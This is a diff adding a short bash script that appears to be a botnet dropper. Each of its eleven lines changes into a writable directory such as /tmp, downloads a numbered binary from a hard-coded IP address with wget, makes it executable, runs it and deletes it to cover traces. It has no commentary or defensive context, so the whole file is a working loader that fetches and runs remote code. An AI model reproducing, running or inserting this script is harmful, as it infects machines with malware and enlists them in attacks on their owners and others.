@@ -1,0 +1,12 @@
+#!/bin/bash
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks1; chmod +x ponydicks1; ./ponydicks1; rm -rf ponydicks1
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks2; chmod +x ponydicks2; ./ponydicks2; rm -rf ponydicks2
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks3; chmod +x ponydicks3; ./ponydicks3; rm -rf ponydicks3
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks4; chmod +x ponydicks4; ./ponydicks4; rm -rf ponydicks4
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks5; chmod +x ponydicks5; ./ponydicks5; rm -rf ponydicks5
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks6; chmod +x ponydicks6; ./ponydicks6; rm -rf ponydicks6
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks7; chmod +x ponydicks7; ./ponydicks7; rm -rf ponydicks7
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks8; chmod +x ponydicks8; ./ponydicks8; rm -rf ponydicks8
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks9; chmod +x ponydicks9; ./ponydicks9; rm -rf ponydicks9
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks10; chmod +x ponydicks10; ./ponydicks10; rm -rf ponydicks10
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://80.233.134.213/ponydicks11; chmod +x ponydicks11; ./ponydicks11; rm -rf ponydicks11
